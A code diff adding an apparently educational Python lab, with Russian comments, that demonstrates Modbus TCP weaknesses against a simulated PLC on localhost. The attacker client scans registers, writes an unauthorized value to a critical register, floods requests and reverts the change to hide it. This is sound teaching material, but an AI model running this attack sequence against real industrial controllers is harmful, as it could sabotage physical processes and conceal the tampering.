@@ -1,0 +1,233 @@
+# ==========================================================
+# ИТОГОВЫЙ СТЕНД: АНАЛИЗ УЯЗВИМОСТЕЙ MODBUS TCP
+# ==========================================================
+
+# 1. Установка библиотеки
+!pip install pyModbusTCP
+
+import time
+import threading
+from pyModbusTCP.server import ModbusServer
+from pyModbusTCP.client import ModbusClient
+
+# --- НАСТРОЙКИ СТЕНДА ---
+HOST = "127.0.0.1"
+PORT = 502
+REG_ADDRESS = 0  # Адрес критического регистра
+
+# --- ЧАСТЬ 1: УМНЫЙ СИМУЛЯТОР ПЛК (ОБЪЕКТ АТАКИ) ---
+class SmartPLC:
+    def __init__(self):
+        # Убираем no_block=True, чтобы явно контролировать запуск
+        self.server = ModbusServer(host=HOST, port=PORT, no_block=False)
+        self.is_running = False
+
+    def start(self):
+        """Запуск сервера в отдельном потоке"""
+        def run_server():
+            print(f"[ПЛК]: Запуск сервера на {HOST}:{PORT}...")
+            self.is_running = True
+            self.server.start()
+            print(f"[ПЛК]: Сервер готов принимать подключения")
+            # Устанавливаем начальное значение (100 - норма)
+            self.server.data_bank.set_holding_registers(REG_ADDRESS, [100])
+            print(f"[ПЛК]: Установлено начальное значение: 100")
+
+        # Запускаем сервер в отдельном потоке
+        self.server_thread = threading.Thread(target=run_server, daemon=True)
+        self.server_thread.start()
+
+        # Ждем, пока сервер точно запустится
+        time.sleep(3)
+
+    def monitor(self):
+        """Система обнаружения аномалий (имитация IDS)"""
+        print("[ПЛК]: Система мониторинга (IDS) активирована...")
+        last_val = 100
+        warning_threshold = 500
+        critical_threshold = 5000
+
+        while self.is_running:
+            try:
+                current_val = self.server.data_bank.get_holding_registers(REG_ADDRESS, 1)
+                if current_val:
+                    val = current_val[0]
+
+                    # Детектируем аномалии
+                    if val > critical_threshold:
+                        print(f"\n[!!! IDS КРИТИЧЕСКОЕ СОБЫТИЕ !!!]")
+                        print(f"Обнаружена диверсия! Значение: {val}")
+                        print("Рекомендуемое действие: Изоляция сегмента сети")
+                        break
+                    elif val > warning_threshold and val != last_val:
+                        print(f"[IDS ПРЕДУПРЕЖДЕНИЕ]: Аномальное значение: {val}")
+
+                    last_val = val
+            except:
+                pass
+            time.sleep(0.5)
+
+    def stop(self):
+        """Корректная остановка сервера"""
+        self.is_running = False
+        self.server.stop()
+        print("[ПЛК]: Сервер остановлен")
+
+# Запускаем ПЛК
+print("="*60)
+print("ИНИЦИАЛИЗАЦИЯ СТЕНДА БЕЗОПАСНОСТИ")
+print("="*60)
+
+plc = SmartPLC()
+plc.start()
+
+# Запускаем мониторинг в отдельном потоке
+monitor_thread = threading.Thread(target=plc.monitor, daemon=True)
+monitor_thread.start()
+time.sleep(1)  # Даем IDS время на запуск
+
+# --- ЧАСТЬ 2: КОМПЛЕКСНАЯ МЕТОДИКА АНАЛИЗА (АТАКА) ---
+print("\n" + "="*60)
+print("НАЧАЛО КОМПЛЕКСНОГО АНАЛИЗА БЕЗОПАСНОСТИ MODBUS TCP")
+print("="*60)
+
+# Инициализируем клиента для атаки
+attacker = ModbusClient(host=HOST, port=PORT, timeout=5)
+
+# Попытка подключения
+if attacker.open():
+    print("[АТАКЕР]: Соединение с ПЛК установлено ✓")
+
+    # ЭТАП 1: РАЗВЕДКА (Enumeration/Scanning)
+    print("\n" + "-"*50)
+    print("[ЭТАП 1]: РАЗВЕДКА - СКАНИРОВАНИЕ ПАМЯТИ ПЛК")
+    print("-"*50)
+
+    active_registers = []
+    scan_range = 10  # Сканируем первые 10 регистров
+
+    for addr in range(0, scan_range):
+        res = attacker.read_holding_registers(addr, 1)
+        if res:
+            print(f"  [НАЙДЕНО] Адрес {addr}: значение = {res[0]}")
+            active_registers.append((addr, res[0]))
+        else:
+            print(f"  [ПУСТО] Адрес {addr}: регистр не используется")
+
+    print(f"\nВЫВОД: Обнаружено {len(active_registers)} активных регистров")
+    print("УЯЗВИМОСТЬ: Злоумышленник может составить полную карту памяти ПЛК")
+
+    # ЭТАП 2: АНАЛИЗ КОНФИДЕНЦИАЛЬНОСТИ (Sniffing)
+    print("\n" + "-"*50)
+    print("[ЭТАП 2]: КОНФИДЕНЦИАЛЬНОСТЬ - ПЕРЕХВАТ ДАННЫХ")
+    print("-"*50)
+
+    if active_registers:
+        target_addr, original_value = active_registers[0]
+        print(f"  [ПЕРЕХВАТ] Регистр {target_addr}: текущее значение = {original_value}")
+        print("ВЫВОД: Данные передаются в открытом виде (plaintext)")
+        print("УЯЗВИМОСТЬ: Отсутствие шифрования трафика")
+
+    # ЭТАП 3: АНАЛИЗ ЦЕЛОСТНОСТИ (Command Injection)
+    print("\n" + "-"*50)
+    print("[ЭТАП 3]: ЦЕЛОСТНОСТЬ - НЕСАНКЦИОНИРОВАННОЕ ИЗМЕНЕНИЕ")
+    print("-"*50)
+
+    malicious_value = 9999
+    print(f"  [АКТИВНАЯ АТАКА] Устанавливаю значение {malicious_value} в регистр {REG_ADDRESS}")
+
+    if attacker.write_single_register(REG_ADDRESS, malicious_value):
+        time.sleep(1)  # Даем время IDS среагировать
+
+        # Проверяем результат
+        verify = attacker.read_holding_registers(REG_ADDRESS, 1)
+        if verify and verify[0] == malicious_value:
+            print(f"  [УСПЕХ] Значение успешно изменено на {verify[0]}")
+            print("ВЫВОД: Полный контроль над техпроцессом")
+            print("УЯЗВИМОСТЬ: Отсутствие аутентификации и авторизации")
+        else:
+            print("  [НЕУДАЧА] Изменение не применено")
+    else:
+        print("  [ОШИБКА] Не удалось выполнить запись")
+
+    # ЭТАП 4: АНАЛИЗ ДОСТУПНОСТИ (DoS Attack)
+    print("\n" + "-"*50)
+    print("[ЭТАП 4]: ДОСТУПНОСТЬ - ТЕСТ НА УСТОЙЧИВОСТЬ К DoS")
+    print("-"*50)
+
+    print("  [FLOOD-АТАКА] Отправка 500 запросов...")
+    request_count = 500
+    successful = 0
+    failed = 0
+
+    start_time = time.time()
+    for i in range(request_count):
+        res = attacker.read_holding_registers(REG_ADDRESS, 1)
+        if res:
+            successful += 1
+        else:
+            failed += 1
+
+        # Прогресс каждые 50 запросов
+        if (i + 1) % 50 == 0:
+            print(f"    Отправлено {i + 1}/{request_count} запросов...")
+
+    end_time = time.time()
+    total_time = end_time - start_time
+
+    print(f"\n  [РЕЗУЛЬТАТ] Успешно: {successful}, Неудачно: {failed}")
+    print(f"  [ПРОИЗВОДИТЕЛЬНОСТЬ] {request_count/ total_time:.1f} запр/сек")
+    print("ВЫВОД: Протокол не имеет встроенной защиты от флуда")
+    print("УЯЗВИМОСТЬ: Отсутствие rate-limiting и механизмов QoS")
+
+    # ЭТАП 5: ВОССТАНОВЛЕНИЕ (Revert Attack)
+    print("\n" + "-"*50)
+    print("[ЭТАП 5]: МАСКИРОВКА СЛЕДОВ АТАКИ")
+    print("-"*50)
+
+    print(f"  [ВОССТАНОВЛЕНИЕ] Возвращаю исходное значение: {original_value}")
+    attacker.write_single_register(REG_ADDRESS, original_value)
+
+    final_check = attacker.read_holding_registers(REG_ADDRESS, 1)
+    print(f"  [ПРОВЕРКА] Финальное значение: {final_check[0]}")
+    print("ВЫВОД: Атака может быть полностью скрыта")
+
+    attacker.close()
+
+else:
+    print("[АТАКЕР]: ОШИБКА ПОДКЛЮЧЕНИЯ")
+    print("Возможные причины:")
+    print("1. Сервер не запущен")
+    print("2. Порт 502 занят другим процессом")
+    print("3. Фаервол блокирует подключение")
+
+# Завершение
+print("\n" + "="*60)
+print("ИТОГОВЫЙ ОТЧЕТ ПО БЕЗОПАСНОСТИ MODBUS TCP")
+print("="*60)
+print("КРИТИЧЕСКИЕ УЯЗВИМОСТИ ПОДТВЕРЖДЕНЫ:")
+print("")
+print("1. НЕТ ШИФРОВАНИЯ (Confidentiality)")
+print("   • Все данные передаются в открытом виде")
+print("   • Возможен пассивный перехват трафика")
+print("")
+print("2. НЕТ АУТЕНТИФИКАЦИИ (Authentication)")
+print("   • Любой может подключиться к ПЛК")
+print("   • Невозможно идентифицировать источник команды")
+print("")
+print("3. НЕТ АВТОРИЗАЦИИ (Authorization)")
+print("   • Нет разграничения прав доступа")
+print("   • Любая команда выполняется без проверки привилегий")
+print("")
+print("4. УГРОЗА ОТКАЗА В ОБСЛУЖИВАНИИ (Availability)")
+print("   • Нет защиты от DoS/DDoS атак")
+print("   • Отсутствуют механизмы rate-limiting")
+print("")
+print("5. ОТСУТСТВИЕ ЦЕЛОСТНОСТИ (Integrity)")
+print("   • Нет цифровых подписей команд")
+print("   • Невозможно обнаружить подмену данных")
+print("="*60)
+
+# Останавливаем ПЛК
+plc.stop()
+print("\n[СТЕНД]: Демонстрация завершена")
